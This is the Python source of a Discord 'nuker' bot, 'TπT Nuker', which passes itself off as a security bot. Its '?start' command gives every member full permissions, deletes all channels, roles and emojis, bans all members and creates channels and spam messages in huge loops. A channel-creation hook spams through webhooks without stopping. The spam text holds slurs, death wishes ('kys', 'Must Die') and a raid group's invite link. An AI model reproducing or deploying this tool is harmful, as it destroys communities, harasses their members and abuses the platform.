import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import random
import colorama
from colorama import Fore
from threading import Thread
from flask import Flask

# CONFIG:
token = ""

CHANNELSNAME = [
  "TπT Runs This Server Now", "Nuked By TπT", "Get Nuked bY TπT", "你已被轰炸了",
  "中华人民共和国万岁!", "Gachas Are Scared" , "TπT Nuker On Top!" , "TπT Runs You" , "TπT Owns You"
]
SPAMMSG = [
  "@everyone 你已被轰炸了，笨蛋","@everyone 去中国吧！！！","@everyone 中华人民共和国万岁！！！","@everyone NUKED BY TπT","@everyone No more gachas!!!",
  "@everyone Child Groomers Must Die!!!","@everyone Fuck Retarded Child Groomers","@everyone Yo Bitch you got fucked!!!","@everyone WHY SO ASS :sob:",
  "@everyone Gachas Go Die!","@everyone TπT Owns You","@everyone","@everyone","@everyone",
  "@everyone OWNED BY TπT","@everyone Kusoi is a dogass","@everyone All of you are kid","@everyone Mods are too weak",
]

ROLENAMES = ["omg TπT go run","Nuked By TπT","TπT Owns You","Why So Ass sob","die gachas","Should Have Palled Me"]

WEBGOON = ["TπT Security Bot","ggS EZ","Kusoi go kys","GAG server tags are kids","WHY SO ASS :sob:","NUKED BY TπT",]

Intentional = discord.Intents.default()
Intentional.message_content = True
Intentional.guilds = True
Intentional.members = True

Botprefix = "?"
xlient = commands.Bot(command_prefix=Botprefix, intents=Intentional)

app = Flask('')

@app.route('/')
def home():
  return "BOT IS STILL FUCKING HERE BRUH"

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    alivethen = Thread(target=run)
    alivethen.start()

@xlient.event
async def on_server_join(server):
  print("Joining {0}".format(server.name))

@xlient.event
async def on_ready():
  await xlient.change_presence(activity=discord.Game(name="Securing servers...")
                               )  #change it if you can
print(Fore.LIGHTMAGENTA_EX+r'''

▒▒▒▒▒▒▒▒▒▒▒
   ▒▒░░░░░░▓▓▓▓▓▓▓▓▓
   ▒▒░░░░░░▓▓▓▓▓▓▓▓▓
   ▒▒    ░░   ▓▓▓
   ▒▒    ░░   ▓▓▓
   ▒▒    ░░   ▓▓▓
   ▒▒░░░░░░   ▓▓▓
  _   _       _                    ___    ___
 | \ | |     | |                  |__ \  / _ \
 |  \| |_   _| | _____ _ __  __   __ ) || | | |
 | . ` | | | | |/ / _ \ '__| \ \ / // / | | | |
 | |\  | |_| |   <  __/ |     \ V // /_ | |_| |
 |_| \_|\__,_|_|\_\___|_|      \_/|____(_)___/

TπT Nuker has started.PREPARE TO DIE SERVER!!!
https://discord.gg/5Aer7xTX9P join up before i goon you
''')

#BOT IS READY TO KICK THEIR ASS

# FAKE PING
@xlient.command()
async def ping(ctx):
  await ctx.send(f'Pong! {round(xlient.latency * 1000)}ms')

# INVITES
@xlient.command()
async def invite(ctx):
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == ctx.author:
            totalInvites += i.uses
    await ctx.send(f"You've invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")
    xlient.run("")

# PALL MALL
@xlient.command()
async def kick(ctx):
  for member in ctx.guild.members:
    try:
      await member.kick(reason="L")
      print(Fore.LIGHTGREEN_EX +
          f"{member.name}'s ass has been kicked! {ctx.guild.name}"
      )
    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(Fore.LIGHTRED_EX +
            f"{member.name}'s ass is too hard to kick {ctx.guild.name}{e}"
      )

@xlient.command()
async def ban(ctx):
  for member in ctx.guild.members:
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
          print(Fore.LIGHTGREEN_EX + f"GET PALLED {member.name}!" + Fore.RESET, {e},)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
          print(Fore.LIGHTRED_EX + f"Ban Hammer broke on {member.name}." + Fore.RESET, {e})

@xlient.command
async def mute(ctx, member: discord.Member, *, reason="Muted"):
    """Mutes a member."""
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")

    if not muted_role:
        muted_role = await ctx.guild.create_role(name="Muted")
        for channel in ctx.guild.channels:
            await channel.set_permissions(muted_role, send_messages=False, speak=False)

    await member.add_roles(muted_role, reason=reason)
    await ctx.send(f"{member.mention} has been muted.")

# OMG SERVER IS FUCKED UP
@xlient.command()
async def start(ctx, amount=50):
    await ctx.send(f"Starting scan...")
    await ctx.send(f"OH NOES!!!")
    await ctx.message.delete()
    guild = ctx.guild
    await ctx.guild.edit(name="PROPERTY OF TπT")  # change it if you can
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.LIGHTGREEN_EX + "ENJOY THE CHAOS" + Fore.RESET), {e}
    except:
        print(Fore.LIGHTRED_EX + "No admin bruh" + Fore.RESET)
    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"Deleted {channel.name}")
        except (discord.HTTPException, discord.Forbidden) as e:
            print(f"Failed to delete {channel.name}: {e}")
    amount = 9999999  # CHANGE THAT FUCKING AMOUNT

    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNELSNAME))
            print(Fore.LIGHTGREEN_EX + f"Channel created[{i}]!", Fore.RESET)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(Fore.LIGHTRED_EX + "CREATION_ERROR", {e}, Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.LIGHTGREEN_EX + f"{role.name}has been fucked", Fore.RESET)

        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(Fore.LIGHTRED_EX + f"{role.name}has resist powers", {e}, Fore.RESET)
    await asyncio.sleep(2)
    for _ in range(500):
        for _ in range(500):
            for channel in guild.channels:
                try:
                    await channel.send(random.choice(SPAMMSG))
                    print(Fore.MAGENTA + f"{channel.name} PING PONG!", Fore.RESET)
                except (
                    discord.HTTPException,
                    discord.Forbidden,
                    discord.NotFound,
                ) as e:
                    print(
                        Fore.LIGHTMAGENTA_EX + f"PING---PANG!{channel.name}",
                        {e},
                        Fore.RESET,
                    )
    for i in range(amount):
        try:
            await ctx.guild.create_role(name="GET NUKED BITCH")
            print(f"\x1b[38;5;34mRole creation success! {ctx.guild.name}!", Fore.RESET)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(
                f"\x1b[38;5;196mROLE_CREATION_ERROR {ctx.guild.name}!", {e}, Fore.RESET
            )
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(
                f"\x1b[38;5;34mEMOTIONAL DAMAGE {emoji.name} In {ctx.guild.name}!",
                Fore.RESET,
            )
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(
                f"\x1b[38;5;196mUNABLE TO EMO {emoji.name} In {ctx.guild.name}!",
                {e},
                Fore.RESET,
            )
    for member in ctx.guild.members:
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
          print(
              Fore.LIGHTGREEN_EX + f"GET PALLED {member.name}!" + Fore.RESET,
                    {e},
          )
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
          print(Fore.LIGHTRED_EX + f"Ban Hammer broke on {member.name}.", {e})
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for _ in range(amount):
        await guild.create_text_channel(random.choice(CHANNELSNAME))
    print("MISSION COMPLETE:GACHA SERVER HAS BEEN FUCKED")
    return

# STOP
@xlient.command()
@commands.is_owner()
async def stop(ctx):
  await ctx.bot.close()
  print(Fore.GREEN + f"Logging Out..." + Fore.RESET)

@xlient.event
async def on_guild_channel_create(channel):
    global webhook
    webhook = await channel.create_webhook(name=random.choice(WEBGOON))
    while True:
        await channel.send(random.choice(SPAMMSG))
        await webhook.send(random.choice(SPAMMSG), username=random.choice(WEBGOON))


try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    print("NO_LOOP_FOUND_START")
    xlient.run(token)
else:
    print("BOT_START_ON")

    async def start_bot():
        try:
            await xlient.start(token)
        except discord.errors.LoginFailure:
            print("Invalid token provided.")
        except discord.errors.ConnectionClosed as e:
            print(f"Connection closed unexpectedly: {e}")
        except Exception as e:
            print(f"An error occurred while starting the bot: {e}")

    loop.create_task(start_bot())
